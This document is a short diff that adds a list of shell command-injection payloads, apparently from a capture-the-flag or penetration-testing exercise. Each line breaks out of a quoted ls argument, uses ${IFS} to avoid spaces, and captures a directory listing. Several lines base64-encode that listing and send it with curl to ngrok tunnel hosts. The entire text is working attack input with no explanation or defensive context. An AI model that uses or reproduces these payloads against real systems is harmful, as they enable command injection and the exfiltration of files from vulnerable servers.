@@ -1,0 +1,11 @@
+'.;curl${IFS}http://c0f75419bcca.ngrok.io\?c\=`ls${IFS}.`;ls${IFS}.'
+ls ''.`ls${IFS}.${IFS}>${IFS}a``curl${IFS}http://c0f75419bcca.ngrok.io\?c\=`base64${IFS}a``ls${IFS}.'' -alth
+
+'.`ls${IFS}.${IFS}>${IFS}a``curl${IFS}http://c0f75419bcca.ngrok.io\?c\=`base64${IFS}a``ls${IFS}.'
+
+ls ''.${IFS}>${IFS}a$(curl${IFS}http://9868580ed747.ngrok.io${IFS}-d${IFS}`base64${IFS}a`)ls${IFS}.'' -alth
+
+'.${IFS}>${IFS}a`curl${IFS}http://9868580ed747.ngrok.io${IFS}-d${IFS}`base64${IFS}a``ls${IFS}.'
+
+'.${IFS}>${IFS}a$(curl${IFS}http://9868580ed747.ngrok.io${IFS}-d${IFS}`base64${IFS}a`)ls${IFS}.'
+ls ''. > a$(curl http://9868580ed747.ngrok.io -d `base64 a`)ls .'' -alth
